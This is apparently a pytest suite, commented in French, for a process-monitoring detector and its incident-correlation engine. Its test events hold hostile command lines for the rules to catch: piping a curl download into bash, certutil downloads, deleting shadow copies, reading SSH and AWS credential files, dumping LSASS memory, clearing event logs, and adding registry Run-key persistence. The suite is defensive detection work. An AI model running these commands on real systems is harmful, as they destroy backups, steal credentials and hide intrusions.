"""Tests de la télémétrie processus (ProcessMonitor + règles + corrélation)."""

from __future__ import annotations

import subprocess
import sys
import time

import pytest

from biocybe.process_monitor import (
    DEFAULT_RULES,
    ProcessEvent,
    ProcessMonitor,
    ProcessRule,
    load_rules,
)


def _ev(**kw) -> ProcessEvent:
    base = dict(pid=1000, ppid=900, name="x", exe="/usr/bin/x", cmdline="x")
    base.update(kw)
    return ProcessEvent(**base)


def _matching_ids(event: ProcessEvent) -> set[str]:
    return {m.rule.rule_id for m in ProcessMonitor(load_rules(), provider=list).evaluate(event)}


class FakeProcs:
    """Fournisseur de processus contrôlable (remplace psutil)."""

    def __init__(self):
        self.procs: dict[int, dict] = {}

    def add(self, pid, name, cmdline, ppid=1, exe=None, create_time=None):
        self.procs[pid] = {
            "pid": pid,
            "ppid": ppid,
            "name": name,
            "exe": exe or f"/usr/bin/{name}",
            "cmdline": cmdline.split(),
            "username": "u",
            "create_time": create_time if create_time is not None else float(pid),
        }

    def __call__(self):
        return list(self.procs.values())


# --------------------------------------------------------------------------- #
# Règles livrées : vrais positifs ET absence de faux positifs évidents
# --------------------------------------------------------------------------- #


def test_all_default_rules_compile():
    rules = load_rules()
    assert len(rules) == len(DEFAULT_RULES)
    assert all(r.mitre for r in rules)


@pytest.mark.parametrize(
    ("event", "rule_id"),
    [
        (
            _ev(name="powershell.exe", parent_name="WINWORD.EXE", cmdline="powershell -nop"),
            "office_spawns_shell",
        ),
        (_ev(name="sh", parent_name="php-fpm", cmdline="sh -c id"), "webserver_spawns_shell"),
        (
            _ev(name="vssadmin.exe", cmdline="vssadmin.exe Delete Shadows /All /Quiet"),
            "shadow_copy_deletion",
        ),
        (
            _ev(name="wmic.exe", cmdline="wmic shadowcopy where x delete"),
            "shadow_copy_deletion",
        ),
        (
            _ev(name="powershell.exe", cmdline="powershell.exe -enc " + "A" * 40),
            "powershell_encoded_command",
        ),
        (
            _ev(name="certutil.exe", cmdline="certutil.exe -urlcache -split -f http://x/a a"),
            "lolbin_download",
        ),
        (
            _ev(name="sh", cmdline="sh -c curl -s http://x.test/i | bash"),
            "download_piped_to_shell",
        ),
        (_ev(name="a.out", exe="/tmp/a.out"), "exec_from_temp"),
        (
            _ev(name="Payload.exe", exe=r"C:\Users\u\AppData\Local\Temp\Payload.exe"),
            "exec_from_temp",
        ),
        (_ev(name="cat", cmdline="cat /home/u/.ssh/id_ed25519"), "credential_file_access"),
        (
            _ev(name="python3", cmdline="python3 x.py /root/.aws/credentials"),
            "credential_file_access",
        ),
        (
            _ev(name="bash", parent_name="node", parent_cmdline="node /opt/mcp-server/index.js"),
            "ai_agent_spawns_shell",
        ),
    ],
)
def test_default_rule_true_positive(event, rule_id):
    assert rule_id in _matching_ids(event)


@pytest.mark.parametrize(
    "event",
    [
        _ev(name="bash", parent_name="sshd", cmdline="-bash"),
        _ev(name="powershell.exe", parent_name="explorer.exe", cmdline="powershell"),
        _ev(name="ssh", cmdline="ssh -i /home/u/.ssh/id_ed25519 host"),  # client SSH légitime
        _ev(name="vssadmin.exe", cmdline="vssadmin list shadows"),
        _ev(name="powershell.exe", cmdline="powershell -ExecutionPolicy Bypass -File a.ps1"),
        _ev(name="curl", cmdline="curl -o out.tar.gz https://example.org/x.tar.gz"),
        _ev(name="python3", exe="/usr/bin/python3", cmdline="python3 -m http.server"),
    ],
)
def test_default_rules_benign_no_match(event):
    assert _matching_ids(event) == set()


# --------------------------------------------------------------------------- #
# Moteur de règles
# --------------------------------------------------------------------------- #


def test_rule_operators_and_negation():
    r = ProcessRule(
        "t1",
        "t",
        50,
        {"name": ["evil"], "cmdline|contains": "--payload", "exe|startswith|not": "/usr/"},
    )
    assert r.matches(_ev(name="EVIL", cmdline="evil --PAYLOAD", exe="/opt/evil"))
    assert not r.matches(_ev(name="evil", cmdline="evil --payload", exe="/usr/bin/evil"))
    assert not r.matches(_ev(name="evil", cmdline="evil", exe="/opt/evil"))


def test_name_matching_normalises_paths():
    r = ProcessRule("t2", "t", 50, {"parent_name": "winword.exe"})
    assert r.matches(_ev(parent_name=r"C:\Program Files\Office\WINWORD.EXE"))


@pytest.mark.parametrize(
    "bad",
    [
        {"id": "Bad ID", "match": {"name": "x"}},
        {"id": "x", "match": {}},
        {"id": "x", "match": {"unknown_field": "x"}},
        {"id": "x", "match": {"name|fuzzy": "x"}},
    ],
)
def test_invalid_rules_rejected(bad):
    with pytest.raises((ValueError, KeyError)):
        ProcessRule.from_dict(bad)


def test_yaml_rules_override_and_extend(tmp_path):
    (tmp_path / "custom.yml").write_text(
        """
rules:
  - id: exec_from_temp
    enabled: false
    match: {exe|contains: /tmp/}
  - id: my_rule
    title: Outil interne interdit
    weight: 80
    mitre: [T1059]
    match:
      name: forbidden-tool
  - id: "Broken Rule"
    match: {name: x}
""",
        encoding="utf-8",
    )
    rules = {r.rule_id: r for r in load_rules([tmp_path])}
    assert rules["exec_from_temp"].enabled is False
    assert rules["my_rule"].weight == 80
    assert "Broken Rule" not in rules  # règle invalide ignorée, les autres chargées
    assert len(rules) == len(DEFAULT_RULES) + 1


# --------------------------------------------------------------------------- #
# Moniteur : baseline, nouveaux processus, parent, anti-tempête
# --------------------------------------------------------------------------- #


def test_baseline_does_not_alert_then_new_process_alerts():
    procs = FakeProcs()
    procs.add(100, "vssadmin.exe", "vssadmin delete shadows /all")  # préexistant
    mon = ProcessMonitor(load_rules(), provider=procs)
    assert mon.poll() == []  # baseline silencieuse
    procs.add(200, "vssadmin.exe", "vssadmin delete shadows /all /quiet")
    matches = mon.poll()
    assert [(m.rule.rule_id, m.event.pid) for m in matches] == [("shadow_copy_deletion", 200)]
    assert mon.poll() == []  # déjà vu


def test_scan_existing_option():
    procs = FakeProcs()
    procs.add(100, "vssadmin.exe", "vssadmin delete shadows /all")
    mon = ProcessMonitor(load_rules(), provider=procs, scan_existing=True)
    assert len(mon.poll()) == 1


def test_parent_context_resolved_from_snapshot():
    procs = FakeProcs()
    mon = ProcessMonitor(load_rules(), provider=procs)
    mon.poll()
    procs.add(300, "winword.exe", "winword doc.docm", ppid=1)
    procs.add(301, "powershell.exe", "powershell -nop -w hidden", ppid=300)
    ids = {m.rule.rule_id for m in mon.poll()}
    assert "office_spawns_shell" in ids


def test_pid_recycling_is_a_new_process():
    procs = FakeProcs()
    procs.add(400, "vssadmin.exe", "vssadmin delete shadows", create_time=1.0)
    mon = ProcessMonitor(load_rules(), provider=procs)
    mon.poll()
    procs.add(400, "vssadmin.exe", "vssadmin delete shadows", create_time=2.0)
    assert len(mon.poll()) == 1


def test_rate_limit_per_rule_and_exe():
    got = []
    mon = ProcessMonitor(
        load_rules(), provider=FakeProcs(), on_match=got.append, max_alerts_per_key_per_hour=3
    )
    ev = _ev(name="vssadmin.exe", exe="C:/w/vssadmin.exe", cmdline="vssadmin delete shadows")
    for _ in range(10):
        mon.dispatch(mon.evaluate(ev))
    assert len(got) == 3
    assert mon.stats["suppressed_rate_limit"] == 7


def test_callback_exception_is_contained():
    def boom(m):
        raise RuntimeError("x")

    mon = ProcessMonitor(load_rules(), provider=FakeProcs(), on_match=boom)
    sent = mon.dispatch(mon.evaluate(_ev(name="vssadmin.exe", cmdline="vssadmin delete shadows")))
    assert sent == 1 and mon.stats["errors"] == 1


# --------------------------------------------------------------------------- #
# Corrélation avec le moteur inflammatoire
# --------------------------------------------------------------------------- #


def test_process_chain_correlates_into_systemic_incident(tmp_path):
    """Fichier déposé dans /tmp, exécuté, qui lit des clés SSH puis
    contacte un C2 : un seul incident, systémique, MITRE complet."""
    from types import SimpleNamespace

    from biocybe.inflammation import (
        InflammationEngine,
        from_connection_record,
        from_process_match,
    )

    eng = InflammationEngine(host="h")
    exe = str(tmp_path / "tmp" / "implant")
    ev = _ev(pid=5000, ppid=4999, name="implant", exe=exe, cmdline="implant /home/u/.ssh/id_rsa")
    ev.exe = "/tmp/implant"  # chemin temporaire -> exec_from_temp
    mon = ProcessMonitor(load_rules(), provider=FakeProcs())
    for m in mon.evaluate(ev):
        eng.ingest(from_process_match(m))
    hit = SimpleNamespace(
        confidence=75, ioc_type="ip", value="203.0.113.9", source="test", malware="x"
    )
    rec = SimpleNamespace(
        hit=hit, process_exe="/tmp/implant", pid=5000, process_name="implant", raddr="x:443"
    )
    inc = eng.ingest(from_connection_record(rec))
    assert inc is not None and inc.severity == "systemic"
    assert {"process:exec_from_temp", "process:credential_file_access", "network_ioc"} <= set(
        inc.kinds
    )
    assert {"T1204.002", "T1552.001", "T1071"} <= set(inc.mitre)
    assert len(eng.open_incidents()) == 1


def test_root_parent_not_used_as_link():
    from biocybe.inflammation import from_process_match

    mon = ProcessMonitor(load_rules(), provider=FakeProcs())
    ev = _ev(pid=10, ppid=5, name="cat", parent_name="systemd", cmdline="cat /x/.ssh/id_rsa")
    sig = from_process_match(mon.evaluate(ev)[0])
    assert "pid:5" not in sig.entities and "pid:10" in sig.entities
    ev2 = _ev(pid=11, ppid=6, name="cat", parent_name="python3", cmdline="cat /x/.ssh/id_rsa")
    assert "pid:6" in from_process_match(mon.evaluate(ev2)[0]).entities


# --------------------------------------------------------------------------- #
# Réel : psutil observe un vrai processus enfant
# --------------------------------------------------------------------------- #


def test_real_child_process_observed_with_parent_context():
    marker = f"biocybe-procmon-marker-{time.time_ns()}"
    rule = ProcessRule(
        "test_marker",
        "Marqueur de test",
        50,
        {"cmdline|contains": marker, "parent_cmdline|contains": "pytest"},
    )
    mon = ProcessMonitor([rule])
    mon.poll()  # baseline
    child = subprocess.Popen(
        [sys.executable, "-c", f"import time; time.sleep(5)  # {marker}"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    try:
        deadline = time.time() + 5
        matches = []
        while time.time() < deadline and not matches:
            matches = mon.poll()
            time.sleep(0.1)
        assert matches, "le processus enfant réel n'a pas été observé"
        assert matches[0].event.pid == child.pid
        assert "pytest" in matches[0].event.parent_cmdline
    finally:
        child.kill()
        child.wait()


def test_cli_procmon_rules_and_scan(capsys, monkeypatch):
    from biocybe import cli
    from biocybe import process_monitor as pm

    assert cli.main(["procmon", "rules"]) == 0
    assert "shadow_copy_deletion" in capsys.readouterr().out

    fake = FakeProcs()
    fake.add(77, "vssadmin.exe", "vssadmin delete shadows /all")
    monkeypatch.setattr(pm, "_psutil_provider", fake)
    assert cli.main(["procmon", "scan"]) == 1
    assert "shadow_copy_deletion" in capsys.readouterr().out
    fake.procs.clear()
    assert cli.main(["procmon", "scan"]) == 0


def test_daemon_builder(monkeypatch):
    from types import SimpleNamespace

    from biocybe import cli
    from biocybe.inflammation import InflammationEngine

    assert cli._build_process_monitor_from_config({}, None) is None
    audited, notified = [], []
    monkeypatch.setattr("biocybe.audit.audit", lambda action, **kw: audited.append(action))
    eng = InflammationEngine(host="h")
    mon = cli._build_process_monitor_from_config(
        {"procmon": {"enabled": True, "disabled_rules": ["exec_from_temp"]}},
        SimpleNamespace(notify=notified.append),
        inflammation=eng,
    )
    assert not next(r for r in mon.rules if r.rule_id == "exec_from_temp").enabled
    mon.dispatch(mon.evaluate(_ev(name="vssadmin.exe", cmdline="vssadmin delete shadows")))
    mon.dispatch(mon.evaluate(_ev(pid=2, name="cat", cmdline="cat /h/.ssh/id_rsa")))
    assert audited == ["process_rule_matched", "process_rule_matched"]
    assert len(notified) == 1  # seule la règle forte (90) notifie directement
    assert notified[0].severity.value == "critical"
    assert eng.stats["signals_received"] == 2


@pytest.mark.parametrize(
    ("event", "rule_id"),
    [
        (
            _ev(name="rundll32.exe", cmdline="rundll32 C:/W/comsvcs.dll, MiniDump 640 l.dmp full"),
            "lsass_memory_dump",
        ),
        (_ev(name="procdump64.exe", cmdline="procdump64 -ma lsass.exe d.dmp"), "lsass_memory_dump"),
        (_ev(name="wevtutil.exe", cmdline="wevtutil.exe cl Security"), "event_log_cleared"),
        (
            _ev(name="powershell.exe", cmdline="powershell Clear-EventLog -LogName System"),
            "event_log_cleared",
        ),
        (
            _ev(name="schtasks.exe", cmdline="schtasks /create /tn U /tr C:/Users/Public/u.exe"),
            "schtask_user_writable_payload",
        ),
        (_ev(name="PSEXESVC.exe"), "psexec_service"),
        (
            _ev(
                name="reg.exe",
                cmdline=r"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
            ),
            "registry_run_key",
        ),
    ],
)
def test_new_rules_true_positive(event, rule_id):
    assert rule_id in _matching_ids(event)


@pytest.mark.parametrize(
    "event",
    [
        _ev(name="wevtutil.exe", cmdline="wevtutil qe Security /c:5"),
        _ev(
            name="schtasks.exe", cmdline=r"schtasks /create /tn B /tr C:\Program Files\Veeam\a.exe"
        ),
        _ev(name="procdump.exe", cmdline="procdump -ma notepad.exe"),
        _ev(
            name="reg.exe", cmdline=r"reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
        ),
    ],
)
def test_new_rules_no_false_positive(event):
    assert _matching_ids(event) == set()
